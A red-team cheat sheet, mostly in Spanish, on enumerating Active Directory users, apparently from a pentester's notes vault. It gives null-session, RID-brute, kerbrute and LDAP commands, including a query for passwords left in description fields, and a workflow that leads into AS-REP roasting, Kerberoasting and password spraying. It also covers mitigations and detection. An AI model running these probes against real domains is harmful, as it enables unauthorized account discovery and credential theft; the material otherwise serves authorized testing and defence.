---
aliases:
  - AD Users Enumeration
  - AD User Discovery
  - User Recon AD
  - LDAP User Filter
tags:
  - type/vulnerability
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
  - "[[Information Gathering]]"
tertiary categories:
  - "[[Active Directory Enumeración]]"
type: CheatSheet
linked:
  - "[[AD - Users Enumeration - User List Extraction]]"
  - "[[AD - Users Enumeration - User Attributes y UAC Flags]]"
  - "[[AD - Users Enumeration - High-Value Users]]"
  - "[[AD - Users Enumeration - User Enumeration Anonymous]]"
  - "[[AD - Users Enumeration - Stale y Misconfigured Users]]"
  - "[[AD - Users Enumeration - Tooling]]"
  - "[[AD - Groups Enumeration]]"
  - "[[Kerberoasting]]"
  - "[[AS-REP Roasting]]"
  - "[[BloodHound & SharpHound]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
---
# AD - Users Enumeration

***

## Cheatsheet

### 🔍 User List Extraction

````tabs
tab: **netexec / crackmapexec**
![[AD - Users Enumeration - User List Extraction#^ad-userlist-netexec]]

tab: **Impacket User Enumeration**
![[AD - Users Enumeration - User List Extraction#^ad-userlist-impacket]]

tab: **LDAP Direct (ldapsearch)**
![[AD - Users Enumeration - User List Extraction#^ad-userlist-ldapsearch]]

tab: **RPC / SAMR Enumeration**
![[AD - Users Enumeration - User List Extraction#^ad-userlist-rpc]]

tab: **Kerberos User Enumeration (kerbrute)**
![[AD - Users Enumeration - User List Extraction#^ad-userlist-kerbrute]]

tab: **OSINT-Based Discovery**
![[AD - Users Enumeration - User List Extraction#^ad-userlist-osint]]
````

### 🆔 User Attributes & UAC Flags

````tabs
tab: **Critical User Attributes**
![[AD - Users Enumeration - User Attributes y UAC Flags#^ad-attrs-critical]]

tab: **UAC Flags Decoded**
![[AD - Users Enumeration - User Attributes y UAC Flags#^ad-attrs-uac]]

tab: **SPN (servicePrincipalName)**
![[AD - Users Enumeration - User Attributes y UAC Flags#^ad-attrs-spn]]

tab: **Delegation Attributes**
![[AD - Users Enumeration - User Attributes y UAC Flags#^ad-attrs-delegation]]

tab: **Shadow Credentials (KeyCredentialLink)**
![[AD - Users Enumeration - User Attributes y UAC Flags#^ad-attrs-shadowcreds]]

tab: **Detection Patterns**
![[AD - Users Enumeration - User Attributes y UAC Flags#^ad-attrs-detection]]
````

### 🎯 High-Value Users

````tabs
tab: **Privileged Group Members**
![[AD - Users Enumeration - High-Value Users#^ad-hv-priv-groups]]

tab: **adminCount Indicator**
![[AD - Users Enumeration - High-Value Users#^ad-hv-admincount]]

tab: **Service Accounts**
![[AD - Users Enumeration - High-Value Users#^ad-hv-service]]

tab: **Delegation Targets**
![[AD - Users Enumeration - High-Value Users#^ad-hv-delegation]]

tab: **sIDHistory (Migration Leftover)**
![[AD - Users Enumeration - High-Value Users#^ad-hv-sidhistory]]

tab: **gMSA / MSA / dMSA**
![[AD - Users Enumeration - High-Value Users#^ad-hv-gmsa]]
````

### 🔓 User Enumeration Anonymous

````tabs
tab: **Null Session SAMR**
![[AD - Users Enumeration - User Enumeration Anonymous#^ad-anon-samr]]

tab: **Anonymous LDAP**
![[AD - Users Enumeration - User Enumeration Anonymous#^ad-anon-ldap]]

tab: **Kerberos Pre-Auth Validation**
![[AD - Users Enumeration - User Enumeration Anonymous#^ad-anon-kerbrute]]

tab: **RID Cycling (Anonymous)**
![[AD - Users Enumeration - User Enumeration Anonymous#^ad-anon-ridcycle]]

tab: **OSINT-Based Discovery**
![[AD - Users Enumeration - User Enumeration Anonymous#^ad-anon-osint]]

tab: **Common Naming Patterns**
![[AD - Users Enumeration - User Enumeration Anonymous#^ad-anon-patterns]]
````

### 📋 Stale & Misconfigured Users

````tabs
tab: **Stale Accounts**
![[AD - Users Enumeration - Stale y Misconfigured Users#^ad-misc-stale]]

tab: **PASSWD_NOTREQD**
![[AD - Users Enumeration - Stale y Misconfigured Users#^ad-misc-passwdnotreqd]]

tab: **DONT_EXPIRE_PASSWORD**
![[AD - Users Enumeration - Stale y Misconfigured Users#^ad-misc-dontexpire]]

tab: **Reversible Encryption**
![[AD - Users Enumeration - Stale y Misconfigured Users#^ad-misc-reversible]]

tab: **Description Field Leakage**
![[AD - Users Enumeration - Stale y Misconfigured Users#^ad-misc-description]]

tab: **Other Misconfig Patterns**
![[AD - Users Enumeration - Stale y Misconfigured Users#^ad-misc-others]]
````

### 🛠️ Tooling

````tabs
tab: **netexec (nxc)**
![[AD - Users Enumeration - Tooling#^ad-tool-netexec-users]]

tab: **Impacket Toolkit**
![[AD - Users Enumeration - Tooling#^ad-tool-impacket-users]]

tab: **kerbrute**
![[AD - Users Enumeration - Tooling#^ad-tool-kerbrute]]

tab: **PowerView / pywerview**
![[AD - Users Enumeration - Tooling#^ad-tool-powerview-users]]

tab: **ldapsearch / Linux LDAP**
![[AD - Users Enumeration - Tooling#^ad-tool-ldapsearch-users]]

tab: **linkedin2username / Wordlists**
![[AD - Users Enumeration - Tooling#^ad-tool-wordlists-users]]
````

___

## Overview

**AD Users Enumeration** = identificar todos los usuarios del dominio, sus atributos críticos (UAC flags, SPNs, descripción), y high-value targets (privileged accounts, service accounts, delegation). Combina LDAP, SAMR/RPC, Kerberos pre-auth y OSINT.

Foundation crítica para la mayoría de ataques AD: Kerberoasting (necesita SPN-bound users), AS-REP Roasting (necesita DONT_REQ_PREAUTH users), password spray (necesita user list), ACL abuse (necesita target users), Shadow Credentials (necesita target users).

### Cuándo es alto impacto

| User enum solo (info) | User enum como input |
|---|---|
| User list reveals attack surface | Password spray candidate list |
| AS-REP roastable users | TGT crackeable offline (CVSS High) |
| Kerberoastable users | Service account hash crack (CVSS High) |
| PASSWD_NOTREQD users | Direct login (CVSS Critical) |
| Description field passwords | Direct cred (CVSS Critical) |
| Stale + privileged | Spray + ATO (CVSS Critical) |
| Unconstrained delegation users | Capture TGT chain (CVSS Critical) |
| sIDHistory misconfig | Cross-trust privesc (CVSS Critical) |

### Diferencia con otros enum hubs

| | **Users Enum** | **Hosts Enum** | **Groups Enum** |
|---|---|---|---|
| Foco | User identities + attrs | Computer objects + topology | Group structure + membership |
| Output | Username/UPN/UAC list | Hostname/OS list | Group hierarchy |
| Auth | Authenticated typical / null partial | Authenticated typical | Authenticated typical |
| Tooling | netexec, kerbrute, GetADUsers | netexec, ldapsearch | Get-ADGroup, Get-ADGroupMember |
| Combine con | Kerberoast, AS-REP, spray, ACL | Lateral, NTLM Relay | Privilege analysis |

### Por qué importa para chains

- **Spray candidate list** — without users, no spray.
- **Kerberoast targets** — SPN-bound users → service account hash crack.
- **AS-REP targets** — DONT_REQ_PREAUTH users → free hashes.
- **Password leakage in description** — direct creds.
- **High-value targets** — focus exploitation on privileged.
- **Stale accounts** — likely weak passwords (spray-friendly).
- **Delegation enumeration** — privesc paths via UD/CD/RBCD.

___

## Workflow de explotación

```
1. External recon (no foothold):
   - LinkedIn → linkedin2username → username candidates
   - Public DNS, breach DBs, OSINT
   - kerbrute userenum to validate (no creds needed)

2. Internal anonymous probes (initial foothold):
   - nxc smb DC -u '' -p '' --users (null session)
   - rpcclient -U "" DC -N -c 'enumdomusers'
   - impacket-lookupsid 'dom/'@DC (RID brute)
   - enum4linux-ng -A DC

3. Authenticated bulk dump (post-cred):
   - nxc ldap DC -u u -p p --users (LDAP)
   - nxc smb DC -u u -p p --rid-brute 10000 (SAMR)
   - impacket-GetADUsers -all dom/u:p (detailed)

4. Filter high-value:
   - --asreproastable (AS-REP)
   - --kerberoasting (Kerberoast)
   - --admin-count (Tier 0)
   - --password-not-required (vuln)
   - --trusted-for-delegation (UD)

5. Attribute analysis:
   - Description field → password leak scan
   - UAC flags → vuln combinations
   - servicePrincipalName → service account ID
   - msDS-AllowedToDelegateTo → delegation paths
   - msDS-KeyCredentialLink → Shadow Credentials

6. Stale + misconfig audit:
   - LastLogonDate < 180 days + Enabled
   - PasswordNeverExpires + privileged
   - PASSWD_NOTREQD + Enabled (direct vuln)
   - Reversible encryption (DCSync recovers cleartext)

7. Cross-correlate for highest-value:
   - Privileged group + service account + stale pwd
   - AdminCount + DONT_REQ_PREAUTH (AS-REP DA)
   - Privileged + delegation enabled
   - Privileged + description leak

8. Plan exploitation:
   a. AS-REP roast → crack offline → ATO
   b. Kerberoast → crack offline → service account ATO
   c. Spray with common passwords → direct ATO
   d. ACL abuse paths → BloodHound chains
   e. Shadow Credentials add → impersonation
```

___

## Detección rápida

### Probes mínimos

```bash
DC="dc01.dom.local"

# 1. Anonymous (test always)
nxc smb $DC -u '' -p '' --users
rpcclient -U "" $DC -N -c 'enumdomusers'
impacket-lookupsid 'dom/'@DC 5000

# 2. OSINT username generation
python3 linkedin2username.py -c "Target Co" -u u -p p -n dom.local
kerbrute userenum --dc $DC -d dom.local linkedin_users.txt -o valid.txt

# 3. Authenticated dumps
USER="user"; PASS="pass"
nxc ldap $DC -u $USER -p $PASS --users > users.txt
nxc ldap $DC -u $USER -p $PASS --asreproastable > asrep.txt
nxc ldap $DC -u $USER -p $PASS --kerberoasting kerb.txt
nxc ldap $DC -u $USER -p $PASS --admin-count > admins.txt
nxc ldap $DC -u $USER -p $PASS --password-not-required > vuln.txt

# 4. Description password leak
ldapsearch -h $DC -D "dom\\$USER" -w $PASS -b "DC=dom,DC=local" \
  "(&(objectCategory=user)(description=*pass*))" \
  samAccountName description

# 5. Stale privileged
Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-180) -and AdminCount -eq 1} `
  -Properties LastLogonDate
```

___

## Impacto

- **Password spray candidates** — comprehensive user list = mass spray attempts.
- **AS-REP roast** — `DONT_REQ_PREAUTH` users → offline hash crack → ATO.
- **Kerberoast** — SPN-bound users → service account hashes → crack → ATO.
- **PASSWD_NOTREQD users** — direct login with empty password.
- **Description leakage** — passwords in free-text fields = direct creds.
- **Stale privileged accounts** — likely weak/old passwords.
- **Reversible encryption** — DCSync recovers cleartext password.
- **Unconstrained delegation users** — capture TGTs of others auth here.
- **sIDHistory abuse** — cross-trust privilege escalation.
- **gMSA dump** — service account hashes via authorized read.
- **Shadow Credentials abuse** — impersonate via KeyCredentialLink write.
- **High-value targeting** — focus on privileged for max impact.
- **OSINT enumeration** — no auth needed for kerbrute validation.
- **Account lockout DoS** — bulk wrong passwords = mass lockout (avoid).

___

## Mitigación (defender)

- **Disable null sessions** — `RestrictAnonymous=2`, `RestrictAnonymousSAM=1`.
- **LDAP signing required** — prevent unauth bind.
- **LDAP channel binding** — modern.
- **Anonymous LDAP bind disabled** — modern Server 2019+ default.
- **Disable PASSWD_NOTREQD** — audit + remove flag:
  ```powershell
  Get-ADUser -Filter {PasswordNotRequired -eq $true} | 
    Set-ADUser -PasswordNotRequired $false
  ```
- **Disable DONT_EXPIRE_PASSWORD** for non-service accounts:
  ```powershell
  Get-ADUser -Filter {PasswordNeverExpires -eq $true -and AdminCount -eq 1} |
    Set-ADUser -PasswordNeverExpires $false
  ```
- **Disable Reversible Encryption** — should never be enabled:
  ```powershell
  Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq $true} |
    Set-ADUser -AllowReversiblePasswordEncryption $false
  ```
- **Audit description fields** — periodic password-keyword scan.
- **Disable AS-REP roastable accounts** — enable pre-auth:
  ```powershell
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} |
    Set-ADAccountControl -DoesNotRequirePreAuth $false
  ```
- **Audit Kerberoastable accounts** — strong passwords (≥25 chars random) for service accounts with SPNs.
- **Use gMSA** for service accounts — auto-rotated.
- **Tier 0 isolation** — privileged accounts in Protected Users group.
- **Stale account cleanup** — disable + delete after 90/180 days inactivity.
- **Detection alerts**:
  ```
  Event ID 4768 (TGT request) bulk = kerbrute
  Event ID 4625 (logon failure) bulk = spray
  Event ID 4624 (success) anomalous = ATO
  Event ID 1644 (LDAP query) bulk = enum
  ```
- **MFA mandatory** for privileged accounts.
- **Service account isolation** — separate from user accounts.
- **Microsoft Defender for Identity** — anomalous user enum detection.
- **Honeypot accounts** — alert on access attempts.

___

## Para entender Users Enumeration

**Por qué AD expone tanta info por defecto:**

AD designed for interoperability — apps need to enumerate users for permissions, address books, distribution lists. `Authenticated Users` group has read on most user attributes by default. Hardening = remove this access (operational pain) + LDAP signing + restricted attribute sets.

**Por qué SAMR null sessions persist:**

Pre-Windows 2000 compatibility. Apps from era depend on null session enumeration. RestrictAnonymous=2 breaks legacy apps. Result: many environments still allow null SAMR for "convenience" — common vuln.

**Por qué kerbrute es OPSEC win:**

LDAP queries are heavy + logged + sometimes blocked. SAMR is loud. RPC is loud. But Kerberos pre-auth requires AS-REQ → KDC response. KDC differentiates valid vs invalid usernames via response code (KDC_ERR_PREAUTH_REQUIRED vs KDC_ERR_C_PRINCIPAL_UNKNOWN). No lockout, fast, single packet per user.

**Por qué AS-REP roast funciona:**

Default Kerberos requires pre-authentication: client encrypts timestamp with own password before requesting TGT. If `DONT_REQ_PREAUTH` flag set, no encryption needed — KDC issues AS-REP (containing encrypted material) to anyone asking. Atacante crack AS-REP offline → user password.

**Por qué Kerberoast funciona:**

When user requests service ticket (TGS) for SPN-bound account, KDC encrypts TGS with service account's NT hash. Atacante (any authenticated user) requests TGS → receives encrypted TGS → crack offline. Service accounts often have weak passwords (operational laziness) → crack feasible.

**Por qué description leakage es tan común:**

Onboarding processes often set initial passwords in description: "Initial password: Welcome2024!". Operators forget to clear. AD auditing rarely scans free-text fields. Atacante run single LDAP query with `(description=*pass*)` filter = instant credentials.

**Por qué adminCount es legacy + still useful:**

`adminCount=1` = user was member of protected group at some point (SDProp marker). AdminSDHolder propagates DACL every 60min to enforced Tier 0 protection. Even if removed from group, flag persists (common bug). Atacante: query adminCount=1 → high-value targets.

**Por qué stale accounts are vuln:**

Old service accounts created years ago with simple passwords (`Service1`, `Pa$$w0rd`). Never rotated. PasswordNeverExpires often set "for convenience". Spray with common passwords → high hit rate. Combined with privileged group membership = critical privesc.

**Por qué password spray > brute force:**

Brute force locks out accounts. Spray = 1 password × N users. No per-user lockout triggered (unless aggressive). Reverse spray (1 pass, many users) avoids domain-wide lockout. Sprayable wordlist: SeasonYear+!, Companyname2024+!, common defaults.

___

## Recursos

- [HackTricks - AD User Enum](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/active-directory-methodology) — reference.
- [The Hacker Recipes - User Enum](https://www.thehacker.recipes/ad/recon/users) — comprehensive.
- [PayloadsAllTheThings - AD Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings) — payloads.
- [SecLists Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames) — wordlists.
- [linkedin2username](https://github.com/initstring/linkedin2username) — OSINT tool.
- [kerbrute](https://github.com/ropnop/kerbrute) — Kerberos userenum.
- [username-anarchy](https://github.com/urbanadventurer/username-anarchy) — name permutations.
- [Impacket](https://github.com/fortra/impacket) — toolkit.
- [netexec](https://github.com/Pennyw0rth/NetExec) — modern CME successor.
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) — adversary.
- [windapsearch](https://github.com/ropnop/windapsearch) — Linux wrapper.
- [BloodHound](https://bloodhound.specterops.io/) — visual analytics.
- [ADSecurity (Sean Metcalf)](https://adsecurity.org/) — defender intel.
- [Microsoft - userAccountControl](https://learn.microsoft.com/en-us/windows/win32/adschema/a-useraccountcontrol) — UAC reference.
- [LDAP Filter Syntax](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) — filter spec.
- [MITRE ATT&CK T1087](https://attack.mitre.org/techniques/T1087/) — Account Discovery.

***
